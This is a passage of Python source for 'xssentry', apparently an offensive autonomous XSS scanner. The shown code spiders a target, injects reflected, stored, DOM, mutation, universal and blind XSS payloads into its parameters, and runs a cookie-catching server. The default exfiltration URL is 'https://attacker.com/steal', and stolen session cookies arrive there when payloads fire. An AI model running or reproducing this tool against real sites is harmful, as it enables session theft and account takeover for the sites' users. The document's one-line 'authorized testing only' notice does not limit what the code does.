        sev = "[bold red]CRIT[/]" if score >= 90 else "[bold red]HIGH[/]" if score >= 70 else "[bold yellow]MED[/]" if score >= 40 else "[bold cyan]LOW[/]"
        
        table.add_row(
            sev,
            f.get("xss_type", "reflected").upper(),
            f.get("param", "N/A"),
            f.get("url", "N/A")[:50],
            f.get("payload", "N/A")[:30] + "...",
            f"[bold]{score}%[/]"
        )
    
    console.print(table)
    console.print()

def main():
    ap = argparse.ArgumentParser(
        description="xssentry v4.0 --- Autonomous XSS Hunter (HELLHOUND-engine)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 xssentry.py https://target.com
  python3 xssentry.py https://target.com --tier 6 -d 5 -t 16
  python3 xssentry.py https://target.com -o report.json

  Authorized security testing only.
        """)
    ap.add_argument("url")
    ap.add_argument("-t","--threads",       type=int,   default=10,
                    help="Concurrent XSS test workers (default: 10)")
    ap.add_argument("--max-pages",          type=int,   default=80)
    ap.add_argument("-o","--output",        help="Save JSON report")
    ap.add_argument("--cookie-port",        type=int,   default=8765)
    ap.add_argument("--no-cookie-server",   action="store_true")
    ap.add_argument("--cookie-catcher",     default=None)
    ap.add_argument("--delay",              type=float, default=0.0)
    ap.add_argument("--no-fuzz",            action="store_true")
    ap.add_argument("--timeout",            type=int,   default=8,
                    help="HTTP timeout per request in seconds (default: 8)")
    ap.add_argument("--blind-port",         type=int, default=0,
                    help="Port for blind XSS OOB server (0=random, -1=disable)")
    ap.add_argument("--cookie",             default=None,
                    help="Session cookie or Authorization header for authenticated scans")
    ap.add_argument("--no-stored",          action="store_true",
                    help="Skip stored XSS scan")
    ap.add_argument("--no-dom",             action="store_true",
                    help="Skip DOM XSS static analysis")
    ap.add_argument("--no-blind",           action="store_true",
                    help="Skip blind XSS scan")
    ap.add_argument("-v","--verbose",       action="store_true",
                    help="Show verbose spider and test output")
    args = ap.parse_args()

    target = args.url.strip()
    if not target.startswith(("http://","https://")): target = "https://" + target

    print_banner()

    with console.status("[bold cyan]Initializing Engines and Resources...", spinner="dots"):
        time.sleep(0.5)

    # Autonomous tier — always 5
    args.tier = 5

    console.print(info(f'Target: [bold white]{target}[/]'))
    console.print()

    # ------ Cookie catch server -----------------------------------------------------------------------
    cookie_srv  = None
    catcher_url = args.cookie_catcher or "https://attacker.com/steal"

    if not args.no_cookie_server and not args.cookie_catcher:
        cookie_srv = CookieCatcher(port=args.cookie_port)
        srv_url    = cookie_srv.start()
        if srv_url:
            catcher_url = srv_url
            tprint(f" {ck_lbl('Cookie catch server started')}")
            tprint(f"Listening --- [bold orange3]{srv_url}[/bold orange3]")
            tprint(f"Cookies arrive here when XSS fires\n")
        else:
            tprint(f"  {warn('Cookie server failed --- using placeholder URL')}\n")
    elif args.cookie_catcher:
        tprint(f"  {ck_lbl(f'Cookie catcher: {color(catcher_url, C.fg(214))}')}\n")

    client    = HTTPClient(timeout=args.timeout)
    hud_state = HUDState(target)

    # AUTOMATIC SPIDER RUN (always)
    final_eps = run_external_spider(target, args)
    if not final_eps:
        hud_state.update(log="Spider found 0 endpoints, using target URL directly.")
        p  = urllib.parse.urlparse(target)
        qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
        final_eps = [{"url": p._replace(query="").geturl(), "method": "GET",
                      "params": {k: (v[0] if v else "") for k, v in qs.items()},
                      "hidden": {}, "source": "cli"}]
    stats = {"pages": len(set(e["url"] for e in final_eps)), "js_files": 0, "spa_eps": 0}

    hud_state.update(endpoints_total=len(final_eps), current_action="Audit Initialization")

    if not final_eps:
        tprint(f"  {err('No testable endpoints found.')}")
        if cookie_srv: cookie_srv.stop()
        sys.exit(0)

    # ------ START TACTICAL HUD -----------------------------------------------------------------------
    hud_ui = CyberTacticalHUD(hud_state)

    def _hud_refresh(live, hud_ui, stop_event):
        while not stop_event.is_set():
            live.update(hud_ui.get_renderable())
            time.sleep(0.15)

    with Live(hud_ui.get_renderable(), console=console, refresh_per_second=10, screen=False) as live:
        _stop = threading.Event()
        _refresher = threading.Thread(target=_hud_refresh, args=(live, hud_ui, _stop), daemon=True)
        _refresher.start()

        # Phase 4: Reflected XSS Testing
        tester   = XSSTester(client, tier=args.tier, delay=args.delay, catcher=catcher_url, hud_state=hud_state)
        findings = tester.run(final_eps, catcher_obj=cookie_srv, threads=args.threads)
        caught   = cookie_srv.summary() if cookie_srv else []

        # Phase 5: Stored XSS
        hud_state.update(current_action="Stored XSS Scan")
        stored_findings = []
        if not getattr(args, "no_stored", False):
            _visited = list(set(e["url"] for e in final_eps))
            stored_scanner = StoredXSSScanner(client, visited_urls=_visited)
            stored_findings = stored_scanner.scan(final_eps, target, hud_state=hud_state)

        # Phase 6: DOM XSS
        hud_state.update(current_action="DOM XSS Scan")
        dom_findings = []
        if not getattr(args, "no_dom", False):
            dom_scanner  = DOMXSSScanner(client)
            dom_eps_done = set()
            for ep in final_eps:
                url = ep["url"]
                if url in dom_eps_done: continue
                dom_eps_done.add(url)
                try:
                    resp = client.get(url, ep["params"])
                    body = resp.get("body", "")
                    dom_findings.extend(dom_scanner.scan_js_source(url, body))
                    dom_findings.extend(dom_scanner.probe_params(url, ep["params"]))
                except Exception: pass

        # Phase 7: mXSS
        hud_state.update(current_action="Mutation XSS Scan")
        mxss_findings = []
        if not getattr(args, "no_stored", False):
            for ep in [e for e in final_eps if e["method"] in ("POST","PUT")][:10]:
                for param in ep["params"]:
                    for mpl in MXSS_PAYLOADS[:6]:
                        try:
                            resp = client.post(ep["url"], {**ep["params"], param: mpl})
                            if any(s in resp.get("body","") for s in ["alert(1)","onerror=alert"]):
                                f = {"type":"mxss","url":ep["url"],"param":param,"payload":mpl[:60],"score":85,"xss_type":"mxss"}
                                mxss_findings.append(f); hud_state.add_finding(f); break
                        except Exception: pass

        # Phase 8: uXSS
        hud_state.update(current_action="Universal XSS Scan")
        uxss_findings = []
        for ep in final_eps[:15]:
            for param in list(ep["params"].keys())[:3]:
                for upl in UXSS_PAYLOADS[:5]:
                    try:
                        resp = (client.get(ep["url"], {**ep["params"], param: upl}) if ep["method"] == "GET"
                                else client.post(ep["url"], {**ep["params"], param: upl}))
                        if "alert(document.domain)" in resp.get("body",""):
                            f = {"type":"uxss","url":ep["url"],"param":param,"payload":upl[:60],"score":90,"xss_type":"uxss"}
                            uxss_findings.append(f); hud_state.add_finding(f); break
                    except Exception: pass

        # Phase 9: Blind XSS
        hud_state.update(current_action="Blind XSS Scan")
        blind_findings = []
        blind_srv      = None
        blind_port     = getattr(args, "blind_port", 0)
        if not getattr(args, "no_blind", False) and blind_port != -1:
            blind_srv = BlindXSSServer(port=blind_port if blind_port else 0)
            blind_url = blind_srv.start()
            if blind_url:
                blind_token  = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
                blind_tester = BlindXSSTester(client, blind_url, blind_token)
                blind_findings = blind_tester.scan(final_eps, blind_srv)
                for bf in blind_findings:
                    hud_state.add_finding({"xss_type":"blind","param":"N/A","url":bf.get("data",{}).get("src","?")})

        hud_state.update(current_action="Audit Complete")
        time.sleep(1)
        _stop.set()

    # ------ Final Report ------
    stats.update({"endpoints": len(final_eps), "params": sum(len(e["params"]) for e in final_eps)})
    print_report(findings, target, stats, caught,
                 stored=stored_findings, dom=dom_findings,
                 mxss=mxss_findings, uxss=uxss_findings, blind=blind_findings)

    if args.output:
        export_json(findings, target, stats, caught, args.output,
                    stored=stored_findings, dom=dom_findings,
                    mxss=mxss_findings, uxss=uxss_findings, blind=blind_findings)

    if cookie_srv: cookie_srv.stop()
    if blind_srv: blind_srv.stop()

if __name__ == "__main__":
    main()